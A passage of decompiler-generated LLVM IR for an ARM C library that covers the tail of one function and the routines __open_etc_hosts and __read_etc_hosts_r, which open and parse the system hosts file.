  br i1 %v6_16e20, label %bb, label %dec_label_pc_16e34

bb:                                               ; preds = %dec_label_pc_16e20
  br label %bb14

dec_label_pc_16e34:                               ; preds = %dec_label_pc_16e20
  %v1_16e34 = bitcast i32* %stack_var_-288 to i8*
  %v2_16e34 = call i32 @__GI_strdup(i8* %v1_16e34)
  store i32 %v2_16e34, i32* %r0.global-to-local, align 4
  %v1_16e38 = load i32, i32* @r6, align 4
  %v2_16e38 = inttoptr i32 %v1_16e38 to i32*
  store i32 %v2_16e34, i32* %v2_16e38, align 4
  %v0_16e3c = load i32, i32* @sl, align 4
  %v1_16e3c = load i32, i32* %r8.global-to-local, align 4
  %v2_16e3c = add i32 %v1_16e3c, %v0_16e3c
  %v3_16e3c = inttoptr i32 %v2_16e3c to i8*
  %v4_16e3c = load i8, i8* %v3_16e3c, align 1
  %v6_16e3c = zext i8 %v4_16e3c to i32
  %v0_16e40 = load i32, i32* @r4, align 4
  %v1_16e40 = add i32 %v0_16e40, 1
  %v2_16e40 = inttoptr i32 %v1_16e40 to i8*
  %v3_16e40 = load i8, i8* %v2_16e40, align 1
  %v4_16e40 = zext i8 %v3_16e40 to i32
  %v4_16e44 = mul nuw nsw i32 %v6_16e3c, 256
  %v5_16e44 = or i32 %v4_16e40, %v4_16e44
  store i32 %v5_16e44, i32* %r3.global-to-local, align 4
  %v1_16e48 = load i32, i32* @r6, align 4
  %v2_16e48 = add i32 %v1_16e48, 4
  %v3_16e48 = inttoptr i32 %v2_16e48 to i32*
  store i32 %v5_16e44, i32* %v3_16e48, align 4
  %v0_16e4c = load i32, i32* @r4, align 4
  %v1_16e4c = add i32 %v0_16e4c, 2
  store i32 %v1_16e4c, i32* %r1.global-to-local, align 4
  %v2_16e50 = inttoptr i32 %v1_16e4c to i8*
  %v3_16e50 = load i8, i8* %v2_16e50, align 1
  %v4_16e50 = zext i8 %v3_16e50 to i32
  %v1_16e54 = add i32 %v0_16e4c, 3
  %v2_16e54 = inttoptr i32 %v1_16e54 to i8*
  %v3_16e54 = load i8, i8* %v2_16e54, align 1
  %v4_16e54 = zext i8 %v3_16e54 to i32
  %v4_16e58 = mul nuw nsw i32 %v4_16e50, 256
  %v5_16e58 = or i32 %v4_16e54, %v4_16e58
  store i32 %v5_16e58, i32* %r3.global-to-local, align 4
  %v1_16e5c = load i32, i32* @r6, align 4
  %v2_16e5c = add i32 %v1_16e5c, 8
  %v3_16e5c = inttoptr i32 %v2_16e5c to i32*
  store i32 %v5_16e58, i32* %v3_16e5c, align 4
  %v0_16e60 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e60 = add i32 %v0_16e60, 2
  %v1_16e64 = add i32 %v0_16e60, 3
  %v2_16e64 = inttoptr i32 %v1_16e64 to i8*
  %v3_16e64 = load i8, i8* %v2_16e64, align 1
  %v4_16e64 = zext i8 %v3_16e64 to i32
  store i32 %v4_16e64, i32* %r3.global-to-local, align 4
  %v2_16e68 = inttoptr i32 %v1_16e60 to i8*
  %v3_16e68 = load i8, i8* %v2_16e68, align 1
  %v4_16e68 = zext i8 %v3_16e68 to i32
  store i32 %v4_16e68, i32* %r0.global-to-local, align 4
  %v1_16e6c = add i32 %v0_16e60, 5
  %v2_16e6c = inttoptr i32 %v1_16e6c to i8*
  %v3_16e6c = load i8, i8* %v2_16e6c, align 1
  %v4_16e6c = zext i8 %v3_16e6c to i32
  %v3_16e70 = mul nuw nsw i32 %v4_16e64, 65536
  store i32 %v3_16e70, i32* %r3.global-to-local, align 4
  %v1_16e74 = add i32 %v0_16e60, 4
  %v2_16e74 = inttoptr i32 %v1_16e74 to i8*
  %v3_16e74 = load i8, i8* %v2_16e74, align 1
  %v4_16e74 = zext i8 %v3_16e74 to i32
  %v4_16e78 = mul nuw i32 %v4_16e68, 16777216
  %v5_16e78 = or i32 %v4_16e78, %v3_16e70
  %v2_16e7c = or i32 %v5_16e78, %v4_16e6c
  %v4_16e80 = mul nuw nsw i32 %v4_16e74, 256
  %v5_16e80 = or i32 %v2_16e7c, %v4_16e80
  store i32 %v5_16e80, i32* %r3.global-to-local, align 4
  %v1_16e84 = load i32, i32* @r6, align 4
  %v2_16e84 = add i32 %v1_16e84, 12
  %v3_16e84 = inttoptr i32 %v2_16e84 to i32*
  store i32 %v5_16e80, i32* %v3_16e84, align 4
  %v0_16e88 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e88 = add i32 %v0_16e88, 6
  %v2_16e88 = inttoptr i32 %v1_16e88 to i8*
  %v3_16e88 = load i8, i8* %v2_16e88, align 1
  %v4_16e88 = zext i8 %v3_16e88 to i32
  %v0_16e8c = load i32, i32* @r4, align 4
  %v1_16e8c = add i32 %v0_16e8c, 9
  %v2_16e8c = inttoptr i32 %v1_16e8c to i8*
  %v3_16e8c = load i8, i8* %v2_16e8c, align 1
  %v4_16e8c = zext i8 %v3_16e8c to i32
  %v1_16e90 = add i32 %v0_16e8c, 10
  store i32 %v1_16e90, i32* %r0.global-to-local, align 4
  %v4_16e94 = mul nuw nsw i32 %v4_16e88, 256
  %v5_16e94 = or i32 %v4_16e8c, %v4_16e94
  store i32 %v5_16e94, i32* %r3.global-to-local, align 4
  %v0_16e98 = load i32, i32* %r8.global-to-local, align 4
  %v1_16e98 = add i32 %v0_16e98, 10
  %v0_16e9c = load i32, i32* @r5, align 4
  %v1_16ea0 = add nuw nsw i32 %v5_16e94, 10
  store i32 %v1_16ea0, i32* %r1.global-to-local, align 4
  %v1_16ea4 = load i32, i32* @r6, align 4
  %v2_16ea4 = add i32 %v1_16ea4, 24
  %v3_16ea4 = inttoptr i32 %v2_16ea4 to i32*
  store i32 %v1_16e98, i32* %v3_16ea4, align 4
  %v0_16ea8 = load i32, i32* %r0.global-to-local, align 4
  %v1_16ea8 = load i32, i32* @r6, align 4
  %v2_16ea8 = add i32 %v1_16ea8, 20
  %v3_16ea8 = inttoptr i32 %v2_16ea8 to i32*
  store i32 %v0_16ea8, i32* %v3_16ea8, align 4
  %v0_16eac = load i32, i32* %r3.global-to-local, align 4
  %v1_16eac = load i32, i32* @r6, align 4
  %v2_16eac = add i32 %v1_16eac, 16
  %v3_16eac = inttoptr i32 %v2_16eac to i32*
  store i32 %v0_16eac, i32* %v3_16eac, align 4
  %v0_16eb0 = load i32, i32* @r7, align 4
  %v1_16eb0 = load i32, i32* %r1.global-to-local, align 4
  %v2_16eb0 = add i32 %v1_16eb0, %v0_16eb0
  %v5_16eb4 = icmp slt i32 %v0_16e9c, %v5_16e94
  %.v2_16eb0 = select i1 %v5_16eb4, i32 -1, i32 %v2_16eb0
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_16e34, %entry
  %v0_16eb8 = phi i32 [ %.v2_16eb0, %dec_label_pc_16e34 ], [ %v1_16e20, %bb ], [ %v0_16e08, %entry ]
  store i32 %v0_16eb8, i32* %r0.global-to-local, align 4
  store i32 %v3_16de8, i32* @r4, align 4
  store i32 %v6_16de8, i32* @r5, align 4
  store i32 %v9_16de8, i32* @r6, align 4
  store i32 %v12_16de8, i32* @r7, align 4
  store i32 %v21_16de8, i32* @sl, align 4
  ret i32 %v0_16eb8

; uselistorder directives
  uselistorder i32 %v0_16eb8, { 1, 0 }
  uselistorder i32 %v5_16e94, { 1, 0, 2 }
  uselistorder i32 %v3_16e70, { 1, 0 }
  uselistorder i32 %v1_16e20, { 0, 2, 1 }
  uselistorder i32 %v0_16e08, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 24, { 26, 27, 28, 18, 35, 0, 29, 30, 31, 19, 10, 36, 11, 1, 32, 20, 21, 22, 23, 24, 25, 12, 33, 34, 13, 14, 15, 16, 17, 7, 8, 4, 3, 9, 2, 5, 6, 37 }
  uselistorder i32 9, { 15, 16, 17, 18, 19, 4, 20, 5, 8, 3, 9, 23, 6, 10, 11, 12, 13, 14, 7, 2, 1, 0, 21, 22 }
  uselistorder i32 5, { 1, 20, 21, 22, 11, 6, 2, 12, 13, 7, 14, 3, 5, 0, 18, 19, 15, 16, 17, 8, 10, 9, 4, 23, 24 }
  uselistorder i32 (i8*)* @__GI_strdup, { 2, 0, 1 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1aecc.614 to i32), i32* @r1, align 4
  %v0_16ec8 = load i32, i32* @lr, align 4
  store i32 %v0_16ec8, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1af30.648 to i32), i32* @r0, align 4
  %v3_16ed0 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1af30.648 to i32), i32 ptrtoint (i32* @global_var_1aecc.614 to i32))
  %v2_16ed4 = icmp eq i32 %v3_16ed0, 0
  store i32 ptrtoint (i32* @global_var_1aecc.614 to i32), i32* @r1, align 4
  br i1 %v2_16ed4, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_16ed0

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_1af3c.650 to i32), i32* @r0, align 4
  %v2_16ee4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_16ee4, i32* @lr, align 4
  %v3_16ee8 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1af3c.650 to i32), i32 ptrtoint (i32* @global_var_1aecc.614 to i32))
  ret i32 %v3_16ee8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 0, 2, 1, 5, 4, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1aecc.614 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_16ef8 = load i32, i32* @r4, align 4
  %v6_16ef8 = load i32, i32* @r5, align 4
  %v12_16ef8 = load i32, i32* @r7, align 4
  %v15_16ef8 = load i32, i32* @r8, align 4
  %v21_16ef8 = load i32, i32* @sl, align 4
  %v24_16ef8 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_16f04 = sub i32 0, %tmp61
  %v1_16f08 = urem i32 %v1_16f04, 4
  store i32 %v1_16f08, i32* %ip.global-to-local, align 4
  %v2_16f08 = icmp eq i32 %v1_16f08, 0
  %v0_16f0c = load i32, i32* @r2, align 4
  %v0_16f10 = load i32, i32* @r0, align 4
  %v0_16f14 = load i32, i32* @r1, align 4
  %v0_16f18 = load i32, i32* @r3, align 4
  store i32 %v0_16f18, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_16f08, label %dec_label_pc_16f38, label %dec_label_pc_16f28

dec_label_pc_16f28:                               ; preds = %entry
  %v2_16f28 = sub i32 %tmp57, %v1_16f08
  %v3_16f28 = icmp ult i32 %tmp57, %v1_16f08
  br i1 %v3_16f28, label %dec_label_pc_1720c, label %dec_label_pc_16f30

dec_label_pc_16f30:                               ; preds = %dec_label_pc_16f28
  store i32 %v2_16f28, i32* %r2.global-to-local, align 4
  %v2_16f34 = add i32 %v1_16f08, %tmp61
  store i32 %v2_16f34, i32* @r4, align 4
  br label %dec_label_pc_16f38

dec_label_pc_16f38:                               ; preds = %entry, %dec_label_pc_16f30
  %v0_16f48 = phi i32 [ %tmp61, %entry ], [ %v2_16f34, %dec_label_pc_16f30 ]
  %v0_16f4c = phi i32 [ %tmp57, %entry ], [ %v2_16f28, %dec_label_pc_16f30 ]
  %tmp = icmp ult i32 %v0_16f4c, 32
  br i1 %tmp, label %dec_label_pc_1720c, label %dec_label_pc_16f40

dec_label_pc_16f40:                               ; preds = %dec_label_pc_16f38
  store i32 %v0_16f18, i32* %r0.global-to-local, align 4
  %v7_16f44 = icmp eq i32 %v0_16f18, 1
  %v1_16f48 = add i32 %v0_16f48, 32
  store i32 %v1_16f48, i32* @fp, align 4
  %v1_16f4c = add i32 %v0_16f4c, -32
  store i32 %v1_16f4c, i32* @r8, align 4
  br i1 %v7_16f44, label %dec_label_pc_17078, label %dec_label_pc_16f54

dec_label_pc_16f54:                               ; preds = %dec_label_pc_16f40
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_16f60 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_16f60, align 4
  %tmp80 = icmp ult i32 %v1_16f4c, 4
  br i1 %tmp80, label %dec_label_pc_1720c, label %dec_label_pc_16f68

dec_label_pc_16f68:                               ; preds = %dec_label_pc_16f54
  %v0_16f68 = load i32, i32* %r2.global-to-local, align 4
  %v1_16f68 = add i32 %v0_16f68, -36
  store i32 %v1_16f68, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_16f68, 8
  br i1 %tmp81, label %dec_label_pc_1720c, label %dec_label_pc_16f74

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16f68
  %v0_16f74 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_16f74, 16
  br i1 %tmp82, label %dec_label_pc_1720c, label %dec_label_pc_16f7c

dec_label_pc_16f7c:                               ; preds = %dec_label_pc_16f74
  %v1_16f7c = add i32 %v0_16f68, -48
  store i32 %v1_16f7c, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_16f7c, 8
  br i1 %tmp83, label %dec_label_pc_1720c, label %dec_label_pc_16f88

dec_label_pc_16f88:                               ; preds = %dec_label_pc_16f7c
  %v1_16f88 = add i32 %v0_16f68, -44
  store i32 %v1_16f88, i32* @r8, align 4
  %v1_16f8c = add i32 %v0_16f68, -56
  store i32 %v1_16f8c, i32* %r3.global-to-local, align 4
  %v3_16f90 = icmp ult i32 %v1_16f8c, %v1_16f88
  br i1 %v3_16f90, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_16f88
  %v1_16f98 = load i32, i32* @r4, align 4
  %v2_16f98 = add i32 %v1_16f98, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_16f88
  store i32 %v1_16f8c, i32* @r8, align 4
  %v1_16f9c.pre = load i32, i32* @r4, align 4
  %v2_16f9c = add i32 %v1_16f9c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_16f9c, %.thread1 ], [ %v2_16f98, %bb ]
  %v0_16fa4 = phi i32 [ %v1_16f9c.pre, %.thread1 ], [ %v1_16f98, %bb ]
  %v0_16fa0 = phi i32 [ %v1_16f8c, %.thread1 ], [ %v1_16f88, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_16fa4 = add i32 %v0_16fa4, 36
  store i32 %v1_16fa4, i32* @r6, align 4
  %v1_16fa8 = add i32 %v0_16fa4, 48
  store i32 %v1_16fa8, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_16fa0, 80
  br i1 %tmp84, label %dec_label_pc_1720c, label %dec_label_pc_16fb0

dec_label_pc_16fb0:                               ; preds = %bb74
  %v0_16fb0 = call i32 @__open_etc_hosts()
  store i32 %v0_16fb0, i32* %r0.global-to-local, align 4
  %v2_16fb4 = icmp eq i32 %v0_16fb0, 0
  br i1 %v2_16fb4, label %dec_label_pc_16fd0, label %.thread

.thread:                                          ; preds = %dec_label_pc_16fb0
  %v1_16fbc = load i32, i32* @fp, align 4
  store i32 %v1_16fbc, i32* @r7, align 4
  %v1_16fc0 = load i32, i32* @r5, align 4
  store i32 %v1_16fc0, i32* @fp, align 4
  %v1_16fc4 = load i32, i32* @r6, align 4
  %v1_16fc8 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17084

dec_label_pc_16fd0:                               ; preds = %dec_label_pc_16fb0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_16fd8 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_16fd8, align 4
  %v0_16fdc = call i32 @__errno_location()
  store i32 %v0_16fdc, i32* %r0.global-to-local, align 4
  %v1_16fe0 = inttoptr i32 %v0_16fdc to i32*
  %v2_16fe0 = load i32, i32* %v1_16fe0, align 4
  store i32 %v2_16fe0, i32* @sl, align 4
  br label %dec_label_pc_17210

dec_label_pc_16fe8:                               ; preds = %dec_label_pc_17198
  %v0_16fe8 = load i32, i32* @r4, align 4
  %v1_16fe8 = add i32 %v0_16fe8, 4
  %v2_16fe8 = inttoptr i32 %v1_16fe8 to i32*
  %v3_16fe8 = load i32, i32* %v2_16fe8, align 4
  %v1_16fec = load i32, i32* @sb, align 4
  %v2_16fec = inttoptr i32 %v1_16fec to i32*
  store i32 %v3_16fe8, i32* %v2_16fec, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_17000 = load i32, i32* @r4, align 4
  %v1_17000 = add i32 %v0_17000, 8
  store i32 %v1_17000, i32* %r1.global-to-local, align 4
  %v1_17004 = load i32, i32* @sb, align 4
  %v2_17004 = add i32 %v1_17004, 8
  %v3_17004 = inttoptr i32 %v2_17004 to i32*
  store i32 2, i32* %v3_17004, align 4
  %v0_17008 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_17008, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_17010 = load i32, i32* @sb, align 4
  %v1_17010 = load i32, i32* %ip.global-to-local, align 4
  %v2_17010 = inttoptr i32 %v1_17010 to i32*
  store i32 %v0_17010, i32* %v2_17010, align 4
  %v0_17014 = load i32, i32* @r7, align 4
  %v1_17014 = load i32, i32* %r0.global-to-local, align 4
  %v2_17014 = inttoptr i32 %v1_17014 to i32*
  store i32 %v0_17014, i32* %v2_17014, align 4
  %v0_17018 = load i32, i32* %r3.global-to-local, align 4
  %v1_17018 = load i32, i32* @sb, align 4
  %v2_17018 = add i32 %v1_17018, 12
  %v3_17018 = inttoptr i32 %v2_17018 to i32*
  store i32 %v0_17018, i32* %v3_17018, align 4
  %v0_1701c = load i32, i32* %r0.global-to-local, align 4
  %v1_1701c = load i32, i32* @sb, align 4
  %v2_1701c = add i32 %v1_1701c, 16
  %v3_1701c = inttoptr i32 %v2_1701c to i32*
  store i32 %v0_1701c, i32* %v3_1701c, align 4
  %v0_17020 = load i32, i32* %r1.global-to-local, align 4
  %v1_17020 = load i32, i32* @sb, align 4
  %v2_17020 = add i32 %v1_17020, 4
  %v3_17020 = inttoptr i32 %v2_17020 to i32*
  store i32 %v0_17020, i32* %v3_17020, align 4
  %v0_17024 = load i32, i32* %r2.global-to-local, align 4
  %v1_17024 = load i32, i32* %r0.global-to-local, align 4
  %v2_17024 = add i32 %v1_17024, 4
  %v3_17024 = inttoptr i32 %v2_17024 to i32*
  store i32 %v0_17024, i32* %v3_17024, align 4
  br label %dec_label_pc_171f4

dec_label_pc_1702c:                               ; preds = %dec_label_pc_171c0
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_17030 = load i32, i32* @r4, align 4
  %v1_17030 = add i32 %v0_17030, 4
  %v2_17030 = inttoptr i32 %v1_17030 to i32*
  %v3_17030 = load i32, i32* %v2_17030, align 4
  store i32 %v3_17030, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_17038 = load i32, i32* @sb, align 4
  %v2_17038 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_17038, i32* %v2_17038, align 4
  store i32 %v0_17090, i32* %ip.global-to-local, align 4
  %v0_17040 = load i32, i32* %r3.global-to-local, align 4
  %v1_17040 = load i32, i32* @sb, align 4
  %v2_17040 = inttoptr i32 %v1_17040 to i32*
  store i32 %v0_17040, i32* %v2_17040, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1704c = load i32, i32* %ip.global-to-local, align 4
  %v1_1704c = load i32, i32* %r0.global-to-local, align 4
  %v2_1704c = inttoptr i32 %v1_1704c to i32*
  store i32 %v0_1704c, i32* %v2_1704c, align 4
  %v0_17050 = load i32, i32* %r3.global-to-local, align 4
  %v1_17050 = load i32, i32* @sb, align 4
  %v2_17050 = add i32 %v1_17050, 12
  %v3_17050 = inttoptr i32 %v2_17050 to i32*
  store i32 %v0_17050, i32* %v3_17050, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_1705c = load i32, i32* @r4, align 4
  %v1_1705c = add i32 %v0_1705c, 8
  store i32 %v1_1705c, i32* %r1.global-to-local, align 4
  %v0_17060 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_17060, i32* @sl, align 4
  %v1_17064 = load i32, i32* @sb, align 4
  %v2_17064 = add i32 %v1_17064, 8
  %v3_17064 = inttoptr i32 %v2_17064 to i32*
  store i32 10, i32* %v3_17064, align 4
  %v0_17068 = load i32, i32* %r3.global-to-local, align 4
  %v1_17068 = load i32, i32* @sb, align 4
  %v2_17068 = add i32 %v1_17068, 16
  %v3_17068 = inttoptr i32 %v2_17068 to i32*
  store i32 %v0_17068, i32* %v3_17068, align 4
  %v0_1706c = load i32, i32* %r1.global-to-local, align 4
  %v1_1706c = load i32, i32* @sb, align 4
  %v2_1706c = add i32 %v1_1706c, 4
  %v3_1706c = inttoptr i32 %v2_1706c to i32*
  store i32 %v0_1706c, i32* %v3_1706c, align 4
  %v0_17070 = load i32, i32* %r2.global-to-local, align 4
  %v1_17070 = load i32, i32* %r3.global-to-local, align 4
  %v2_17070 = add i32 %v1_17070, 4
  %v3_17070 = inttoptr i32 %v2_17070 to i32*
  store i32 %v0_17070, i32* %v3_17070, align 4
  br label %dec_label_pc_171f4

dec_label_pc_17078:                               ; preds = %dec_label_pc_16f40
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_17084

dec_label_pc_17084:                               ; preds = %.thread, %dec_label_pc_17078
  %v2_17094.pre-phi = phi i32* [ %v2_16f60, %.thread ], [ %.pre, %dec_label_pc_17078 ]
  %v0_17090 = phi i32 [ %v1_16fbc, %.thread ], [ 0, %dec_label_pc_17078 ]
  %stack_var_-40.1 = phi i32 [ %v1_16fc8, %.thread ], [ 0, %dec_label_pc_17078 ]
  %stack_var_-48.1 = phi i32 [ %v1_16fc4, %.thread ], [ 0, %dec_label_pc_17078 ]
  %stack_var_-52.0 = phi i32 [ %v0_16fb0, %.thread ], [ %v0_16f10, %dec_label_pc_17078 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_17094.pre-phi, align 4
  %v2_17158 = inttoptr i32 %v0_16f14 to i8*
  %v7_17190 = icmp eq i32 %v0_16f0c, 2
  %v7_171b8 = icmp eq i32 %v0_16f0c, 10
  br label %dec_label_pc_171dc

dec_label_pc_1709c:                               ; preds = %dec_label_pc_171dc
  %v0_1709c = load i32, i32* @fp, align 4
  store i32 %v0_1709c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_170a4 = call i32 @__GI_strchr(i32 %v0_1709c, i32 35)
  store i32 %v2_170a4, i32* %r0.global-to-local, align 4
  %v3_170a8 = icmp eq i32 %v2_170a4, 0
  br i1 %v3_170a8, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_1709c
  %v0_170b011 = load i32, i32* @fp, align 4
  store i32 %v0_170b011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_1711c.preheader

bb75:                                             ; preds = %dec_label_pc_1709c
  %v3_170a4 = inttoptr i32 %v2_170a4 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_170b0 = load i32, i32* @fp, align 4
  store i32 %v0_170b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_170a4, align 1
  %v0_1711c30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1711c.preheader

dec_label_pc_1711c.preheader:                     ; preds = %bb75, %.thread10
  %v0_1711c30 = phi i32 [ %v0_1711c30.pre, %bb75 ], [ %v0_170b011, %.thread10 ]
  %v1_1711c31 = inttoptr i32 %v0_1711c30 to i8*
  %v2_1711c32 = load i8, i8* %v1_1711c31, align 1
  %v3_1711c33 = zext i8 %v2_1711c32 to i32
  store i32 %v3_1711c33, i32* %r3.global-to-local, align 4
  %v2_1712034 = icmp eq i8 %v2_1711c32, 0
  br i1 %v2_1712034, label %dec_label_pc_17128, label %dec_label_pc_170c8.preheader

dec_label_pc_170c0:                               ; preds = %dec_label_pc_170d4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_170c4 = inttoptr i32 %v8_170ec to i8*
  store i8 0, i8* %v3_170c4, align 1
  %v4_170c4 = load i32, i32* %r2.global-to-local, align 4
  %v5_170c4 = add i32 %v4_170c4, 1
  store i32 %v5_170c4, i32* %r2.global-to-local, align 4
  %v1_170c8 = inttoptr i32 %v5_170c4 to i8*
  %v2_170c8 = load i8, i8* %v1_170c8, align 1
  %v3_170c8 = zext i8 %v2_170c8 to i32
  store i32 %v3_170c8, i32* %r1.global-to-local, align 4
  %v2_170cc = icmp eq i8 %v2_170c8, 0
  br i1 %v2_170cc, label %dec_label_pc_17128, label %dec_label_pc_170d4

dec_label_pc_170d4:                               ; preds = %dec_label_pc_170c8.preheader, %dec_label_pc_170c0
  %v8_170ec = phi i32 [ %v5_170c4, %dec_label_pc_170c0 ], [ %v0_170c820, %dec_label_pc_170c8.preheader ]
  %v1_170dc = phi i32 [ %v3_170c8, %dec_label_pc_170c0 ], [ %v3_170c823, %dec_label_pc_170c8.preheader ]
  %v2_170d8 = load i32, i32* @global_var_231b0, align 4
  store i32 %v2_170d8, i32* %r3.global-to-local, align 4
  %v3_170dc = mul nuw nsw i32 %v1_170dc, 2
  %v4_170dc = add i32 %v3_170dc, %v2_170d8
  %v5_170dc = inttoptr i32 %v4_170dc to i8*
  %v6_170dc = load i8, i8* %v5_170dc, align 1
  %v8_170dc = zext i8 %v6_170dc to i32
  store i32 %v8_170dc, i32* %r3.global-to-local, align 4
  %v1_170e0 = and i32 %v8_170dc, 32
  %v2_170e0 = icmp eq i32 %v1_170e0, 0
  br i1 %v2_170e0, label %dec_label_pc_170e8, label %dec_label_pc_170c0

dec_label_pc_170e8:                               ; preds = %dec_label_pc_170d4
  %v0_170e8 = load i32, i32* @r6, align 4
  %v7_170ec = icmp slt i32 %v0_170e8, 7
  br i1 %v7_170ec, label %bb76, label %dec_label_pc_170fc.preheader

bb76:                                             ; preds = %dec_label_pc_170e8
  %v9_170ec = load i32, i32* @r4, align 4
  %v13_170ec = mul i32 %v0_170e8, 4
  %v14_170ec = add i32 %v9_170ec, %v13_170ec
  %v15_170ec = inttoptr i32 %v14_170ec to i32*
  store i32 %v8_170ec, i32* %v15_170ec, align 4
  %v8_170f0 = load i32, i32* @r6, align 4
  %v9_170f0 = add i32 %v8_170f0, 1
  store i32 %v9_170f0, i32* @r6, align 4
  %v0_170fc25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_170fc.preheader

dec_label_pc_170fc.preheader:                     ; preds = %bb76, %dec_label_pc_170e8
  %v0_170fc25 = phi i32 [ %v0_170fc25.pre, %bb76 ], [ %v8_170ec, %dec_label_pc_170e8 ]
  %v1_170fc26 = inttoptr i32 %v0_170fc25 to i8*
  %v2_170fc27 = load i8, i8* %v1_170fc26, align 1
  %v3_170fc28 = zext i8 %v2_170fc27 to i32
  store i32 %v3_170fc28, i32* %r1.global-to-local, align 4
  %v2_1710029 = icmp eq i8 %v2_170fc27, 0
  br i1 %v2_1710029, label %dec_label_pc_1711c.loopexit, label %dec_label_pc_17108.lr.ph

dec_label_pc_17108.lr.ph:                         ; preds = %dec_label_pc_170fc.preheader
  %v2_1710c.pre = load i32, i32* @global_var_231b0, align 4
  br label %dec_label_pc_17108

dec_label_pc_170f8:                               ; preds = %dec_label_pc_17108
  %v1_170f8 = add i32 %v0_170f8, 1
  store i32 %v1_170f8, i32* %r2.global-to-local, align 4
  %v1_170fc = inttoptr i32 %v1_170f8 to i8*
  %v2_170fc = load i8, i8* %v1_170fc, align 1
  %v3_170fc = zext i8 %v2_170fc to i32
  store i32 %v3_170fc, i32* %r1.global-to-local, align 4
  %v2_17100 = icmp eq i8 %v2_170fc, 0
  br i1 %v2_17100, label %dec_label_pc_1711c.loopexit, label %dec_label_pc_17108

dec_label_pc_17108:                               ; preds = %dec_label_pc_17108.lr.ph, %dec_label_pc_170f8
  %v0_170f8 = phi i32 [ %v0_170fc25, %dec_label_pc_17108.lr.ph ], [ %v1_170f8, %dec_label_pc_170f8 ]
  %v1_17110 = phi i32 [ %v3_170fc28, %dec_label_pc_17108.lr.ph ], [ %v3_170fc, %dec_label_pc_170f8 ]
  store i32 %v2_1710c.pre, i32* %r3.global-to-local, align 4
